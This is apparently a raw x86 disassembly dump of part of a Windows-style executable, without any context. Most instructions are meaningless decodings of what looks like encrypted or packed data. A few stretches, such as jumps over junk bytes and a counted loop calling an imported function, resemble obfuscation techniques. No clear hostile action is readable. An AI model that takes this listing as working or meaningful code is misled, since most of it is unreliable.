  40dacf:	push   0x1beee1fc
  40dad4:	mov    dl,0x27
  40dad6:	mov    al,ds:0xd6099e74
  40dadb:	adc    DWORD PTR ds:[ebx+0x4a9cd7dc],edx
  40dae2:	lahf   
  40dae3:	sbb    bh,BYTE PTR es:[esi]
  40dae6:	sbb    esp,DWORD PTR [edi]
  40dae8:	mov    edi,0x82d69fad
  40daed:	cli    
  40daee:	adc    eax,0x4accfa46
  40daf3:	add    cl,dh
  40daf5:	div    bh
  40daf7:	sub    ah,dh
  40daf9:	in     al,0x99
  40dafb:	lock ret 
  40dafd:	and    eax,0x19deb246
  40db02:	hlt    
  40db03:	dec    ecx
  40db04:	dec    edi
  40db05:	add    ah,BYTE PTR [eax+ecx*4+0x7277b793]
  40db0c:	(bad)  
  40db0d:	ins    DWORD PTR es:[edi],dx
  40db0e:	ss jmp 0xfea0:0x32c34815
  40db16:	ins    BYTE PTR es:[edi],dx
  40db17:	xor    bh,BYTE PTR [edi]
  40db19:	jae    0x40db90
  40db1b:	adc    DWORD PTR [edi],eax
  40db1d:	mov    cl,0xbd
  40db1f:	xlat   BYTE PTR ds:[ebx]
  40db20:	ss jmp 0x40daf2
  40db23:	out    0x1c,eax
  40db25:	sub    eax,0xbd1d3536
  40db2a:	lahf   
  40db2b:	ret    
  40db2c:	mov    ebp,0x6e75686b
  40db31:	fsubr  QWORD PTR [esi+0x3e]
  40db34:	jecxz  0x40db74
  40db36:	enter  0x23cf,0x36
  40db3a:	sbb    DWORD PTR [esi-0x4b],0xffffffe9
  40db3e:	pushf  
  40db3f:	sbb    al,0xf5
  40db41:	push   esp
  40db42:	inc    edi
  40db43:	daa    
  40db44:	mov    esi,0x3985bce8
  40db49:	repnz cmp ebp,DWORD PTR [ecx+0xde41261]
  40db50:	push   ds
  40db51:	test   BYTE PTR [di-0x1127],ah
  40db56:	clc    
  40db57:	pop    ecx
  40db58:	sbb    ecx,ebp
  40db5a:	pop    ds
  40db5b:	add    cl,BYTE PTR [ebp+0x15fa209b]
  40db61:	cdq    
  40db62:	push   ds
  40db63:	in     al,dx
  40db64:	xchg   ebp,eax
  40db65:	fcomp  DWORD PTR [ecx]
  40db67:	inc    edx
  40db68:	stos   BYTE PTR es:[edi],al
  40db69:	and    bh,dh
  40db6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db6c:	scas   al,BYTE PTR es:[edi]
  40db6d:	retf   0x75cb
  40db70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db71:	inc    esi
  40db72:	xor    BYTE PTR [ecx-0x21d67d4b],dh
  40db78:	outs   dx,DWORD PTR ds:[esi]
  40db79:	push   eax
  40db7a:	in     al,0xa2
  40db7c:	hlt    
  40db7d:	iret   
  40db7e:	sub    ch,dh
  40db80:	xchg   ebx,eax
  40db81:	pushf  
  40db82:	pusha  
  40db83:	ret    0x201a
  40db86:	ret    
  40db87:	ret    0xe49a
  40db8a:	repz fsubr DWORD PTR [ebx+0x37]
  40db8e:	in     eax,0xe0
  40db90:	call   0x13c50f56
  40db95:	jns    0x40db48
  40db97:	fisubr DWORD PTR [esi-0x67]
  40db9a:	(bad)  
  40db9c:	stos   BYTE PTR es:[edi],al
  40db9d:	push   0x19
  40db9f:	stos   DWORD PTR es:[edi],eax
  40dba0:	out    dx,al
  40dba1:	and    ch,ah
  40dba3:	out    0x48,eax
  40dba5:	mov    al,0x64
  40dba7:	sub    ebx,DWORD PTR [edi+0x47]
  40dbaa:	std    
  40dbab:	test   DWORD PTR [ebx],esp
  40dbad:	add    ecx,DWORD PTR [ebp-0x57e560b3]
  40dbb3:	shl    DWORD PTR [edx+0x3b],cl
  40dbb6:	ror    DWORD PTR [edi],0x85
  40dbb9:	add    BYTE PTR [edx],0x0
  40dbbc:	add    BYTE PTR [ebx-0x38cc03bb],cl
  40dbc2:	jmp    0x40de1f
  40dbc7:	mov    edi,0x5dc09dfd
  40dbcc:	loopne 0x40dc31
  40dbce:	adc    DWORD PTR [esi+0x3340145c],0xfac515fa
  40dbd8:	sahf   
  40dbd9:	jle    0x40dc59
  40dbdb:	ds jl  0x40dc5c
  40dbde:	jle    0x40db88
  40dbe0:	inc    ebp
  40dbe1:	adc    edx,ebp
  40dbe3:	mov    esp,0xcf79bbd6
  40dbe8:	ret    
  40dbe9:	inc    ebp
  40dbea:	gs jp  0x40dc6c
  40dbed:	lock xchg ebp,eax
  40dbef:	xor    BYTE PTR [eax],al
  40dbf1:	dec    ebp
  40dbf2:	int3   
  40dbf3:	enter  0x749c,0xc4
  40dbf7:	mov    edx,0xa1929392
  40dbfc:	sbb    DWORD PTR [ebp-0x45],esi
  40dbff:	sbb    BYTE PTR [esi+ecx*2+0xe58fae9],bl
  40dc06:	popf   
  40dc07:	xchg   ecx,eax
  40dc08:	push   edx
  40dc09:	mov    esi,0xdd556df0
  40dc0e:	hlt    
  40dc0f:	cdq    
  40dc10:	add    al,0xdf
  40dc12:	(bad)  
  40dc13:	retf   
  40dc14:	pop    ecx
  40dc15:	cmc    
  40dc16:	rcl    DWORD PTR [eax],1
  40dc18:	and    DWORD PTR [eax-0x7517a34],0xf8790ad7
  40dc22:	mov    dl,0x5c
  40dc24:	loop   0x40dc9c
  40dc26:	xchg   edi,eax
  40dc27:	dec    eax
  40dc28:	or     al,0x7e
  40dc2a:	pop    esp
  40dc2b:	icebp  
  40dc2c:	outs   dx,DWORD PTR ds:[esi]
  40dc2d:	rol    DWORD PTR [edx],cl
  40dc2f:	jns    0x40dc09
  40dc31:	lea    esi,[edi+0x36551f21]
  40dc37:	rcl    DWORD PTR [ebx-0x2b],cl
  40dc3a:	pcmpeqd mm1,mm1
  40dc3d:	or     cl,ch
  40dc3f:	retf   
  40dc40:	mov    BYTE PTR [ebx-0x4bf04325],ch
  40dc46:	adc    al,0x8f
  40dc48:	pop    ebp
  40dc49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc4a:	add    eax,0xc6d798e8
  40dc4f:	and    BYTE PTR [edx],0x31
  40dc52:	jmp    0xe099a024
  40dc57:	lea    edx,[edi-0x72]
  40dc5a:	arpl   WORD PTR [esi+0x45b5d145],ax
  40dc60:	je     0x40dcd7
  40dc62:	cs mov al,0xf4
  40dc65:	ret    
  40dc66:	pop    eax
  40dc67:	push   ss
  40dc68:	in     al,dx
  40dc69:	sbb    eax,0x14e9aef7
  40dc6e:	retf   0x1052
  40dc71:	mov    eax,0xce96d123
  40dc76:	int    0xb1
  40dc78:	fmul   QWORD PTR [esi-0x4c332c39]
  40dc7e:	jp     0x40dce8
  40dc80:	fsubrp st(4),st
  40dc82:	fisubr WORD PTR [eax+0x32]
  40dc85:	jae    0x40dcac
  40dc87:	test   eax,0xd29ea271
  40dc8c:	les    ebx,FWORD PTR ss:[edi+0x10]
  40dc90:	test   al,0x30
  40dc92:	push   0x1a44793e
  40dc97:	sub    DWORD PTR [eax],0x25
  40dc9a:	out    0xcc,al
  40dc9c:	pushf  
  40dc9d:	pop    ebx
  40dc9e:	adc    eax,0xfa15e4a7
  40dca3:	cmc    
  40dca4:	lock fcompp 
  40dca7:	sar    DWORD PTR [eax],1
  40dca9:	out    0xff,al
  40dcab:	cmc    
  40dcac:	call   0xc21910a8
  40dcb1:	ds into 
  40dcb3:	jno    0x40dc98
  40dcb5:	and    eax,DWORD PTR [ecx]
  40dcb7:	ret    0x19b8
  40dcba:	ror    DWORD PTR [ebx-0x71],cl
  40dcbd:	jno    0x40dcbc
  40dcbf:	shr    DWORD PTR [esi],1
  40dcc1:	xchg   BYTE PTR [edi],bh
  40dcc3:	jg     0x40dcca
  40dcc5:	fimul  WORD PTR [ecx]
  40dcc7:	xchg   ebx,eax
  40dcc8:	iret   
  40dcc9:	aad    0x5a
  40dccb:	fiadd  WORD PTR [ecx+ebx*2+0x6b]
  40dccf:	sbb    al,0x29
  40dcd1:	arpl   si,di
  40dcd3:	push   ebx
  40dcd4:	scas   eax,DWORD PTR es:[edi]
  40dcd5:	inc    esi
  40dcd6:	imul   ecx,DWORD PTR [edi-0x53],0xaa6815be
  40dcdd:	retf   0xd3ec
  40dce0:	loopne 0x40dd18
  40dce2:	int3   
  40dce3:	ds cmp al,0xa0
  40dce6:	retf   0x5887
  40dce9:	fwait
  40dcea:	les    edx,FWORD PTR [eax-0x61]
  40dced:	lods   eax,DWORD PTR ds:[esi]
  40dcee:	test   al,0x78
  40dcf0:	sub    ah,BYTE PTR [edx]
  40dcf2:	jmp    0xf3d6859f
  40dcf7:	adc    BYTE PTR [edx-0x709885ba],bh
  40dcfd:	cmp    al,0x83
  40dcff:	xchg   esp,eax
  40dd00:	xchg   edx,eax
  40dd01:	push   es
  40dd02:	call   ecx
  40dd04:	fldenv [ebx]
  40dd06:	cmp    al,0xde
  40dd08:	push   ebx
  40dd09:	dec    esp
  40dd0a:	push   edi
  40dd0b:	call   0xb228:0xcc07fb91
  40dd12:	jmp    0x40dd04
  40dd14:	jno    0x40dd00
  40dd16:	mov    esi,0x2c2b5ec7
  40dd1b:	dec    ecx
  40dd1c:	mov    edi,ebx
  40dd1e:	mov    bh,ah
  40dd20:	and    eax,DWORD PTR [ebx+0x141b5bc2]
  40dd26:	aad    0x88
  40dd28:	rcr    BYTE PTR [ecx],cl
  40dd2a:	mov    esp,0x844db96e
  40dd2f:	and    al,dh
  40dd31:	inc    eax
  40dd32:	xchg   ecx,eax
  40dd33:	jg     0x40dd79
  40dd35:	xor    edi,edx
  40dd37:	or     eax,0x5617912b
  40dd3c:	inc    eax
  40dd3d:	push   ss
  40dd3e:	ss jnp 0x40dd06
  40dd41:	loope  0x40dd40
  40dd43:	sbb    bh,bh
  40dd45:	shl    DWORD PTR [ecx-0x491656a6],cl
  40dd4b:	scas   eax,DWORD PTR es:[edi]
  40dd4c:	aas    
  40dd4d:	push   0xefc616f4
  40dd52:	sbb    edx,DWORD PTR [edi-0x6b]
  40dd55:	push   esi
  40dd56:	(bad)  
  40dd57:	push   ss
  40dd58:	add    esi,DWORD PTR [esi+ecx*8-0x1d]
  40dd5c:	stos   BYTE PTR es:[edi],al
  40dd5d:	jbe    0x40dd34
  40dd5f:	push   ds
  40dd60:	push   0x9c9255ea
  40dd65:	mov    ah,0xe0
  40dd67:	mov    BYTE PTR [eax],ah
  40dd69:	mov    ebp,0xdc3d8435
  40dd6e:	pusha  
  40dd6f:	sbb    esi,edx
  40dd71:	dec    edx
  40dd72:	xchg   ecx,eax
  40dd73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd74:	lods   al,BYTE PTR ds:[esi]
  40dd75:	test   DWORD PTR [eax-0x3],esp
  40dd78:	sbb    eax,0xf95ca05d
  40dd7d:	imul   edx,DWORD PTR [esp+ebp*2-0x6bdb3553],0x60cf9abf
  40dd88:	scas   al,BYTE PTR es:[edi]
  40dd89:	inc    ebx
  40dd8a:	push   esp
  40dd8b:	xor    ebx,DWORD PTR ss:[ebx]
  40dd8e:	jbe    0x40dddf
  40dd90:	lds    ecx,FWORD PTR [esi+0x1df16706]
  40dd96:	arpl   di,bx
  40dd98:	jp     0x40de10
  40dd9a:	int3   
  40dd9b:	sbb    dh,BYTE PTR [eax]
  40dd9d:	nop
  40dd9e:	xchg   DWORD PTR [ebx+0x4a276a52],ecx
  40dda4:	pop    esi
  40dda5:	mov    edx,0x2dc0af7c
  40ddaa:	outs   dx,DWORD PTR ds:[esi]
  40ddab:	stc    
  40ddac:	sub    al,0x6e
  40ddae:	rcl    BYTE PTR [esi+0xe747e9],cl
  40ddb4:	jmp    0x6a08dcc4
  40ddb9:	mov    dh,0x5d
  40ddbb:	jmp    0xfc844710
  40ddc0:	and    DWORD PTR [eax-0x54a5f4bb],ecx
  40ddc6:	cmp    eax,0x845761f1
  40ddcb:	stc    
  40ddcc:	shl    DWORD PTR [esi],0xa8
  40ddcf:	retf   
  40ddd0:	xor    ebp,ebp
  40ddd2:	loope  0x40dd69
  40ddd4:	mov    esi,0xf2796e63
  40ddd9:	lahf   
  40ddda:	mov    eax,0x3716c859
  40dddf:	aaa    
  40dde0:	or     ah,bh
  40dde2:	stc    
  40dde3:	or     ebp,DWORD PTR [ecx-0x63]
  40dde6:	mov    dl,0x8d
  40dde8:	idiv   BYTE PTR [esi+0x5f]
  40ddeb:	jge    0x40ddfe
  40dded:	(bad)  
  40ddee:	aam    0x2a
  40ddf0:	push   esp
  40ddf1:	outs   dx,DWORD PTR ds:[esi]
  40ddf2:	inc    esi
  40ddf3:	mov    dl,0xd3
  40ddf5:	loopne 0x40dd92
  40ddf7:	jno    0x40de43
  40ddf9:	mov    ebp,edx
  40ddfb:	inc    ebx
  40ddfc:	clc    
  40ddfd:	sbb    eax,0x7c672ce3
  40de02:	inc    esp
  40de03:	test   ch,dh
  40de05:	call   0xcf54:0x48ca4e7a
  40de0c:	or     cl,BYTE PTR [ebp+0x4ee3fce]
  40de12:	shl    BYTE PTR [ebp+edx*4-0x7a401556],0xc2
  40de1a:	ins    BYTE PTR es:[edi],dx
  40de1b:	popa   
  40de1c:	arpl   WORD PTR [edi-0x41],ax
  40de1f:	add    eax,esi
  40de21:	mov    ds:0x413bb8,eax
  40de26:	mov    eax,DWORD PTR [ebp-0x4]
  40de29:	xor    eax,edi
  40de2b:	add    eax,esi
  40de2d:	mov    ds:0x413bb0,eax
  40de32:	push   DWORD PTR [ebp-0x8]
  40de35:	push   DWORD PTR [ebp-0x4]
  40de38:	call   0x40de4a
  40de3d:	mov    eax,DWORD PTR [ebp-0x4]
  40de40:	xor    eax,edi
  40de42:	pop    edi
  40de43:	add    eax,esi
  40de45:	pop    esi
  40de46:	leave  
  40de47:	ret    0xc
  40de4a:	push   ebp
  40de4b:	mov    ebp,esp
  40de4d:	sub    esp,0x60
  40de50:	and    DWORD PTR ds:0x43379f,0x0
  40de5a:	mov    eax,ds:0x43379f
  40de5f:	inc    eax
  40de60:	mov    ds:0x43379f,eax
  40de65:	cmp    DWORD PTR ds:0x43379f,0x27
  40de6c:	jne    0x40de7e
  40de72:	push   DWORD PTR [ebp-0xc]
  40de75:	push   DWORD PTR [ebp-0x10]
  40de78:	call   DWORD PTR ds:0x4120e8
  40de7e:	cmp    DWORD PTR ds:0x43379f,0x19
  40de85:	jb     0x40de5a
  40de8b:	xor    DWORD PTR ds:0x4337ef,0x6001
  40de95:	jmp    0x40dfce
  40de9a:	push   ecx
  40de9c:	inc    ebp
  40de9d:	jb     0x40df10
  40de9f:	jb     0x40de4a
  40dea1:	icebp  
  40dea2:	fisubr WORD PTR [esi]
  40dea4:	into   
  40dea5:	not    DWORD PTR ds:0xba8104bd
  40deab:	pushf  
  40deac:	jle    0x40df2c
  40deae:	adc    bh,BYTE PTR [edi+0x7e]
  40deb1:	jle    0x40dee5
  40deb3:	(bad)  
  40deb4:	xchg   edx,eax
  40deb5:	cld    
  40deb6:	gs cld 
  40deb8:	inc    eax
  40deb9:	add    bh,al
  40debb:	fwait
  40debc:	jl     0x40ded7
  40debe:	ja     0x40de9f
  40dec0:	(bad)  
  40dec1:	sar    DWORD PTR [ecx],cl
  40dec3:	out    dx,eax
  40dec4:	ret    
  40dec5:	pop    edx
  40dec6:	cwde   
  40dec7:	xor    ecx,ecx
  40dec9:	mov    ecx,0xc7b9996
  40dece:	xor    ebx,ebp
  40ded0:	cwde   
  40ded1:	retf   0x7a8b
  40ded4:	push   ecx
  40ded5:	std    
  40ded6:	push   edi
  40ded7:	dec    ebx
  40ded8:	out    0x3,al
  40deda:	inc    ebx
  40dedb:	or     dh,bh
  40dedd:	dec    esi
  40dede:	mov    WORD PTR [ebp+0x62],?
  40dee1:	les    edi,FWORD PTR [esi+edx*4-0x188e5c1d]
  40dee8:	mov    ch,0x1
  40deea:	outs   dx,DWORD PTR ds:[esi]
  40deeb:	popf   
  40deec:	fsub   DWORD PTR [esi+0x35]
  40deef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40def0:	jnp    0x40df45
  40def2:	lds    ebp,FWORD PTR [edi+0x181edee]
  40def8:	mov    ch,0x8b
  40defa:	and    esp,DWORD PTR [edi]
  40defc:	rol    DWORD PTR [esp+edi*1-0x79],1
  40df00:	xchg   BYTE PTR [ecx],dh
  40df02:	push   eax
  40df03:	push   esp
  40df04:	sbb    esp,DWORD PTR [edi+0x7e5c5bab]
  40df0a:	cli    
  40df0b:	ss (bad) 
  40df0d:	fcmovb st,st(3)
  40df0f:	gs xor eax,0x6c59fed4
  40df15:	cmc    
  40df16:	(bad)  
  40df17:	mov    edi,0xb3d7959d
  40df1c:	pop    ds
  40df1d:	dec    esi
  40df1e:	retf   
  40df1f:	sbb    ah,BYTE PTR [ebx+0x303ba62e]
  40df25:	fdivr  DWORD PTR [ebp+eiz*4+0x5aaafb60]
  40df2c:	sbb    al,0x9b
  40df2e:	cmp    eax,0xe73c86a3
  40df33:	inc    esi
  40df34:	adc    DWORD PTR [edx],ecx
  40df36:	aaa    
  40df37:	mov    eax,ds:0x2ed7d548
  40df3c:	scas   eax,DWORD PTR es:[edi]
  40df3d:	fnstenv [edi+0x6a]
  40df40:	loop   0x40df89
  40df42:	les    edx,FWORD PTR [ecx+0x10]
  40df45:	jg     0x40dfb4
  40df47:	push   eax
  40df48:	loopne 0x40df6c
  40df4a:	fistp  DWORD PTR [ecx+edx*4]
  40df4d:	test   DWORD PTR [esi-0xd2db5e1],esp
  40df53:	scas   eax,DWORD PTR es:[edi]
  40df54:	fwait
  40df55:	sbb    al,0x18
  40df57:	popa   
  40df58:	inc    edi
  40df59:	in     eax,dx
  40df5a:	dec    ecx
  40df5b:	aad    0x84
  40df5d:	xor    BYTE PTR [edx],cl
  40df5f:	fnstenv [esi-0x33]
  40df62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df63:	fwait
  40df64:	and    al,0xfc
  40df66:	scas   al,BYTE PTR es:[edi]
  40df67:	push   ebx
  40df68:	cmp    al,0xae
  40df6a:	loopne 0x40df4c
  40df6c:	and    eax,0x63fbd725
  40df71:	sub    eax,0x1deeae1d
  40df76:	jno    0x40df68
  40df78:	in     al,dx
  40df79:	xchg   ebx,eax
  40df7a:	cmp    BYTE PTR [ebx+ebx*2+0x20fe6a47],cl
  40df81:	mov    esp,0xe9cd95e9
  40df86:	xchg   ecx,eax
  40df87:	pop    ebp
  40df88:	cs push es
  40df8a:	loope  0x40dfc5
  40df8c:	inc    edi
  40df8d:	loopne 0x40df40
  40df8f:	sbb    esi,DWORD PTR [edx+0xa]
  40df92:	daa    
  40df93:	cmp    al,0xae
  40df95:	sar    cl,1
  40df97:	and    BYTE PTR [ecx-0x635b7d1b],bl
  40df9d:	mov    bh,0xbd
  40df9f:	xchg   ebp,eax
  40dfa0:	shl    DWORD PTR [edx],cl
  40dfa2:	loopne 0x40e011
  40dfa4:	pop    esp
  40dfa5:	sbb    al,0x8c
  40dfa7:	sbb    DWORD PTR [edi-0x2f434d26],0xffffffcb
  40dfae:	pop    es
  40dfaf:	outs   dx,DWORD PTR ds:[esi]
  40dfb0:	jns    0x40dfe2
  40dfb2:	idiv   DWORD PTR [edx+0x45f0cbaa]
  40dfb8:	or     eax,edx
  40dfba:	pop    edx
  40dfbb:	xchg   ebx,eax
  40dfbc:	xchg   esp,eax
  40dfbd:	mov    al,ds:0x6a938162
  40dfc2:	push   edi
  40dfc3:	inc    esp
  40dfc4:	adc    dh,BYTE PTR [ecx-0x74]
  40dfc7:	dec    eax
  40dfc8:	inc    edi
  40dfc9:	mov    dh,0xac
  40dfcb:	push   ebx
  40dfcc:	cmp    al,0x6a
  40dfce:	mov    eax,DWORD PTR [ebp+0x8]
  40dfd1:	sub    DWORD PTR ds:0x433797,0x625
  40dfdb:	push   ebx
  40dfdc:	sub    DWORD PTR ds:0x4337eb,0x540f
  40dfe6:	push   esi
  40dfe7:	or     ebx,0x36b6
  40dfed:	mov    esi,0x7510854
  40dff2:	jmp    0x40e12b
  40dff7:	cmp    BYTE PTR [ebx-0x678ee5cf],dh
  40dffd:	shl    DWORD PTR [ecx+0x78],1
  40e000:	xor    esi,ecx
  40e002:	stos   BYTE PTR es:[edi],al
  40e003:	jmp    0x5ea83de3
  40e008:	popf   
  40e009:	jle    0x40e089
  40e00b:	adc    bh,BYTE PTR [edi+0x7e]
  40e00e:	jle    0x40dfbf
  40e010:	mov    eax,ds:0x43cf826a
  40e015:	ins    DWORD PTR es:[edi],dx
  40e016:	mov    edi,0xd5b3c32f
  40e01b:	dec    eax
  40e01c:	(bad)  
  40e01e:	jmp    0x40e04a
  40e020:	repnz mov esp,0x40831230
  40e026:	or     edi,eax
  40e028:	xchg   ebx,eax
  40e029:	call   0xb86b:0x960e06ea
  40e030:	jb     0x40e093
  40e032:	push   0x3
  40e034:	add    BYTE PTR [edx],0x52
  40e037:	lods   al,BYTE PTR ds:[esi]
  40e038:	pop    ebp
  40e039:	mov    ecx,0xc3d57d44
  40e03e:	adc    al,0x6e
  40e040:	inc    ebp
  40e041:	or     eax,0xc67da9c6
  40e046:	aas    
  40e047:	dec    esp
  40e048:	sbb    BYTE PTR [ebx],0xa7
  40e04b:	mov    bh,0x1c
  40e04d:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40e04f:	or     BYTE PTR [esi],bl
  40e051:	xor    edi,DWORD PTR [ebp+0x2ba0b616]
  40e057:	dec    esi
  40e058:	mov    bl,0xac
  40e05a:	test   DWORD PTR [esi-0x7b],ebx
  40e05d:	fldcw  WORD PTR ds:0xb7ec0979
  40e063:	inc    edx
  40e064:	adc    ebx,DWORD PTR [ebx+0x35]
  40e067:	fadd   QWORD PTR [eax+0x68]
  40e06a:	pop    ss
  40e06b:	lahf   
  40e06c:	mov    ebx,0xc8c21f4f
  40e071:	jle    0x40e0d9
  40e073:	dec    ebp
  40e074:	test   al,0xb1
  40e076:	stos   BYTE PTR es:[edi],al
  40e077:	loop   0x40e014
  40e079:	sahf   
  40e07a:	ins    BYTE PTR es:[edi],dx
  40e07b:	sbb    ebx,ecx
  40e07d:	pop    esi
  40e07e:	pushf  
  40e07f:	jno    0x40e0f3
  40e081:	dec    ebx
  40e082:	inc    esi
  40e083:	and    eax,0xb62abf45
  40e088:	push   ecx
  40e089:	and    DWORD PTR [ecx-0x435bc9ab],esi
  40e08f:	and    BYTE PTR [edx+esi*2],ah
  40e092:	jecxz  0x40e0ac
  40e094:	dec    DWORD PTR [edi-0x19]
  40e097:	in     ax,0xd2
  40e09a:	loopne 0x40e101
  40e09c:	loop   0x40e0fb
  40e09e:	mov    esp,DWORD PTR [ebx-0x29193502]
  40e0a4:	les    edi,FWORD PTR [ebx-0x5c]
  40e0a7:	scas   eax,DWORD PTR es:[edi]
  40e0a8:	jge    0x40e059
  40e0aa:	inc    ebx
  40e0ab:	cmp    eax,edi
  40e0ad:	or     DWORD PTR [edi],edi
  40e0af:	rcl    DWORD PTR [edi],cl
  40e0b1:	loop   0x40e069
  40e0b3:	adc    al,BYTE PTR [ecx+0x49713258]
  40e0b9:	xor    bh,BYTE PTR [esi+0x35faae64]
  40e0bf:	mov    eax,0x2d42d3ac
  40e0c4:	and    eax,0x305714eb
  40e0c9:	jmp    0x87a3:0x811f6c4b
  40e0d0:	aas    
  40e0d1:	jo     0x40e13a
  40e0d3:	pop    ecx
  40e0d4:	pop    DWORD PTR [edi-0x6f]
  40e0d7:	mov    ch,0xd7
  40e0d9:	retf   
  40e0da:	in     al,dx
  40e0db:	cwde   
  40e0dc:	loopne 0x40e07c
  40e0de:	or     ecx,DWORD PTR [ebx-0x3c1fd1f6]
  40e0e4:	sbb    ch,dh
  40e0e6:	fadd   QWORD PTR [edx-0x1d]
  40e0e9:	sub    bl,BYTE PTR [esi+0x4ede8a41]
  40e0ef:	mov    ebp,0x3b9275e
  40e0f4:	xor    ecx,DWORD PTR [esi]
  40e0f6:	test   BYTE PTR [ebx+edi*4-0x7e],cl
  40e0fa:	push   es
  40e0fb:	mov    ebp,0xb7a69c37
  40e100:	enter  0x7152,0xa2
  40e104:	and    ch,BYTE PTR [eax]
  40e106:	aaa    
  40e107:	int    0xd8
  40e109:	fwait
  40e10a:	mov    ecx,0x47c6f74c
  40e10f:	jecxz  0x40e0bc
  40e111:	mov    WORD PTR [ebx-0xd],fs
  40e114:	mov    WORD PTR [eax+ecx*1],cs
  40e117:	xchg   ebx,eax
  40e118:	push   cs
  40e119:	push   cs
  40e11a:	mov    WORD PTR ds:0xa92b2be2,gs
  40e120:	xor    cl,al
  40e122:	xor    BYTE PTR [eax+0x37689a75],ch
  40e128:	pusha  
  40e129:	fwait
  40e12a:	xor    BYTE PTR [ebx],dh
  40e12c:	mov    BYTE PTR [ecx+0x4337a315],0x0
  40e133:	xchg   edi,eax
  40e134:	and    BYTE PTR [eax],al
  40e136:	add    BYTE PTR [ebx+0x32729b],bh
  40e13c:	xor    DWORD PTR ds:0x4337ef,0x2259
  40e146:	add    eax,ebx
  40e148:	push   edi
  40e149:	jmp    0x40e282
  40e14e:	pop    ebx
  40e14f:	jecxz  0x40e12d
  40e151:	call   0x71acd2ba
  40e156:	and    ecx,DWORD PTR [eax]
  40e158:	out    0xd3,al
  40e15a:	loope  0x40e1cd
  40e15c:	sbb    al,0x2a
  40e15e:	jb     0x40e0fa
  40e160:	jle    0x40e1e0
  40e162:	adc    bh,BYTE PTR [edi+0x7e]
  40e165:	jle    0x40e15b
  40e167:	out    0x20,al
  40e169:	sbb    edx,0xffffffa8
  40e16c:	mov    ebx,DWORD PTR [esp+edi*4+0x63]
  40e170:	(bad)  
  40e171:	rcl    DWORD PTR [eax],1
  40e173:	sub    BYTE PTR [eax+0x7d],bl
  40e176:	sub    BYTE PTR [esi-0x2f],al
  40e179:	mov    ebx,0x4ba1a81
  40e17e:	fstp   DWORD PTR ds:[di]
  40e182:	mov    esp,ss
  40e184:	test   BYTE PTR [esi],dl
  40e186:	hlt    
  40e187:	in     eax,0x13
  40e189:	(bad)  
  40e18a:	dec    esi
  40e18b:	(bad)  
  40e18c:	icebp  
  40e18d:	dec    edx
  40e18e:	aas    
  40e18f:	xchg   edi,eax
  40e190:	in     eax,dx
  40e191:	pusha  
  40e192:	(bad)
  40e195:	xchg   edi,eax
  40e196:	pop    esp
  40e197:	or     al,0xb
  40e199:	add    bl,BYTE PTR [ebx]
  40e19b:	jecxz  0x40e1d9
  40e19d:	das    
  40e19e:	or     BYTE PTR [edi-0x61e39f07],0xdd
  40e1a5:	aam    0xee
  40e1a7:	and    ebp,0x5d298a4a
  40e1ad:	int3   
  40e1ae:	in     eax,0x49
  40e1b0:	or     edx,DWORD PTR [eax+edx*8]
  40e1b3:	fcom   QWORD PTR [ecx-0x4b]
  40e1b6:	sub    edx,esi
  40e1b8:	sub    BYTE PTR [ebx],bh
  40e1ba:	dec    esp
  40e1bb:	mov    DWORD PTR [ebp-0x64b593b3],edi
  40e1c1:	mov    cl,0x6d
  40e1c3:	scas   eax,DWORD PTR es:[edi]
  40e1c4:	push   ds
  40e1c5:	shr    DWORD PTR [ecx+0x86962ec],cl
  40e1cb:	call   DWORD PTR [edi+ecx*1-0x6e]
  40e1cf:	push   edi
  40e1d0:	mov    ds:0xa8b6daec,eax
  40e1d5:	mov    esp,0xc98fe01e
  40e1da:	mov    ebp,0x49faeaac
  40e1df:	in     al,0x8d
  40e1e1:	dec    edi
  40e1e2:	jmp    0x2cd8:0xd96c0c0d
  40e1e9:	data16 cmp al,0xaa
  40e1ec:	jl     0x40e22d
  40e1ee:	xchg   esp,eax
  40e1ef:	jnp    0x40e1d1
  40e1f1:	xchg   ebp,eax
  40e1f2:	mov    ebx,0x6fe5dfb2
  40e1f7:	mov    eax,ss
  40e1f9:	dec    edi
  40e1fa:	clc    
  40e1fb:	ror    BYTE PTR [ebx+0x3ac743aa],cl
  40e201:	outs   dx,DWORD PTR ds:[esi]
  40e202:	popa   
  40e203:	or     bh,BYTE PTR [ecx+0x6a]
  40e206:	cdq    
  40e207:	push   eax
  40e208:	pop    eax
  40e209:	shl    edx,cl
  40e20b:	pop    edx
  40e20c:	cwde   
  40e20d:	inc    edx
  40e20e:	fldcw  WORD PTR [edi+0x5a87851b]
  40e214:	(bad)  
  40e215:	int    0x57
  40e217:	mov    eax,0x6118a073
  40e21c:	mov    esp,0xfb2de933
  40e221:	inc    esi
  40e222:	mov    esp,0x56e01567
  40e227:	adc    ebx,ebp
  40e229:	cwde   
  40e22a:	jge    0x40e1b6
  40e22c:	mov    ecx,0xf32e629b
  40e231:	jns    0x40e1fa
  40e233:	mov    eax,ds:0xc23b4c5d
  40e238:	pop    edi
  40e239:	(bad)  
  40e23a:	fstp   QWORD PTR [edx]
  40e23c:	mov    al,0xaa
  40e23e:	push   eax
  40e23f:	jns    0x40e260
  40e241:	call   0x69510d8a
  40e246:	pop    esp
  40e247:	and    al,BYTE PTR [esi+0x4e]
  40e24a:	(bad)  
  40e24b:	clc    
  40e24c:	sbb    DWORD PTR [ebx-0x4d],ebx
  40e24f:	xor    esp,ebx
  40e251:	cdq    
  40e252:	mov    esp,0xefd47c8d
  40e257:	add    BYTE PTR [eax],dh
  40e259:	jmp    0x40e1f8
  40e25b:	dec    ebx
  40e25c:	fadd   QWORD PTR [edx+0x14]
  40e25f:	jl     0x40e202
  40e261:	retf   0x13fb
  40e264:	call   0x6fea6378
  40e269:	(bad)  
  40e26a:	imul   edi,ebp,0x2
  40e26d:	add    ah,BYTE PTR [edi+0x36]
  40e270:	xchg   esp,eax
  40e271:	sbb    BYTE PTR [ecx+0x72],ch
  40e274:	add    BYTE PTR [ecx-0x9],dh
  40e277:	dec    eax
  40e278:	inc    esi
  40e279:	mov    dh,0xe3
  40e27b:	popf   
  40e27c:	sub    al,0xc
  40e27e:	jb     0x40e289
